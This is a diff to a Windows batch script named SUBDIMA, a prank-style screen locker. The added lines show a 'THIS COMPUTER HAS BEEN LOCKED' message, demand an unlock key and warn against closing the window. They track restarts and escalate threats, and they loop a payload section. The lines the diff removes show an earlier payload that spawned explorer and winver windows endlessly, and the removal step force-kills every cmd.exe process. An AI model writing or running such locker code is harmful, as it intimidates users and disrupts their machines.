@@ -16,6 +16,7 @@ if /I "%errorlevel%" == "1" set test=0
 if /I "%1" == "about" goto :about
 if /I "%1" == "init" goto :firstinit
 if /I "%1" == "restart" goto :restarted
+cls
 goto :about
 
 :about
@@ -51,7 +52,7 @@ echo Press any key to exit... (But will it?)
 pause > nul
 exit
 
-::============================== Program ==============================
+::============================== Start / Restart ==============================
 
 :firstinit
 echo Preparing first initialization...
@@ -62,20 +63,42 @@ set key=%random%
 cls
 goto :code
 
-:: When restarted
 :restarted
+::if /I "%attempts%" LSS "1" goto :noattempts
+set /p restarts=< "%tmp%\SUBDIMA\count"
+if /I "%restarts%" == "1 " (
 echo Oh shit, you actually closed me!!
-echo I guess Ill change the code and give you only 1 attempt :)
+echo I guess Ill change the code and give you only 1 attempt hehe
 set attempts=1
 set key=%random%%random%%random%%random%
 timeout /t 3 /nobreak > nul
 cls
 goto :code
+)
+if /I "%restarts%" == "2 " (
+echo I RECOMMEND YOU STOP DOING THAT OR FACE THE CONSEQUENCES
+echo THIS IS YOUR LAST WARNING
+set attempts=1
+set key=%random%%random%%random%%random%
+timeout /t 3 /nobreak > nul
+cls
+goto :code
+)
+if /I "%restarts%" == "3 " (
+echo I WARNED YOU...
+timeout /t 2 /nobreak > nul
+cls
+goto :code
+)
 
+::============================== Main ==============================
 
 :code
 if /I "%attempts%" LSS "1" goto :noattempts
-echo. WHAHAHA YOU GOT FUCKED BY SUBDIMA
+echo. THIS COMPUTER HAS BEEN LOCKED BY SUBDIMA
+echo.
+echo. Don't worry, your files are still there.. if you have a key
+echo. Please don't try to close me as it will only make things worse
 echo.
 echo. To unlock this PC, please enter a valid key.
 echo. %attempts% attempts left...
@@ -105,6 +128,8 @@ set /a "attempts=%attempts%-1"
 cls
 goto :code
 
+::============================== Payload ==============================
+
 :noattempts
 cls
 start "" "%tmp%\SUBDIMA\notepad.vbs"
@@ -113,9 +138,15 @@ if /I "%test%" == "0" goto :payload
 if /I "%test%" == "1" (
 goto :remove
 )
-echo tf how did you get here
-pause
-goto :remove
+
+:payload
+echo. > "%tmp%\SUBDIMA\stop-taskend.pls"
+:: start "" explorer.exe
+:: start "" winver.exe
+echo payoad would've executed
+goto :payload
+
+::============================== Removal ==============================
 
 :unlock
 cls
@@ -127,10 +158,5 @@ timeout /t 4 /nobreak > nul
 goto :remove
 
 :remove
-powershell "taskkill -im cmd.exe /f; rd /S /Q "%tmp%\SUBDIMA; explorer.exe"
+powershell "taskkill -im cmd.exe /f; rd /S /Q "$env:tmp\SUBDIMA; explorer.exe"
 exit
-
-:payload
-explorer.exe
-winver.exe
-goto :payload
